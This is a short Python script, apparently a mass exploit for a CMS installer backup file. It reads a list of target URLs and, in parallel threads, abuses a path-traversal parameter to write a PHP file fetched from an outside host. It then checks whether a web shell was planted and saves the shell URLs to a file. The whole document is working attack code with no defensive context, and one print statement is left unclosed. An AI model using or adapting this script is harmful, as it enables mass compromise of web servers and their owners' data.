import requests
import os
import threading

payload=['/install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=../data/xx.php&updateHost=http://www.ynfhlw.com/','/data/xx.php','gif89a']

user=input('file:')
if os.path.exists(user):
    print('[+]open {} ok !'.format(user))
else:
    print('[-]Not found {}'.format(user))
    exit()


def explot(urls):
    headers = {'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'}
    url1="{}".format(urls+payload[0]).strip()
    url2="{}".format(urls+payload[1]).strip()
    gjz=payload[2]
    try:
        rw=requests.get(url='{}/install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=../data/admin/config_update.php '.format(urls),headers=headers)
        rqt=requests.get(url=url1,headers=headers)
        rqt2=requests.get(url=url2,headers=headers)
        if gjz in rqt2.text or gjz in rqt2.content.decode('utf-8'):
            print('[+]shell url:{}'.format(rqt2.url)
            print('[+]shell url:{}'.format(rqt2.url),file=open('good.txt','a'))
        else:
            print('[-]no shell {}'.format(rqt2.url))
    except:
        pass
if __name__ == '__main__':
    dk=open('{}'.format(user),'r')
    for r in dk.readlines():
        qc="".join(r.split('\n'))
        t=threading.Thread(target=explot,args=(qc,))
        t.start()
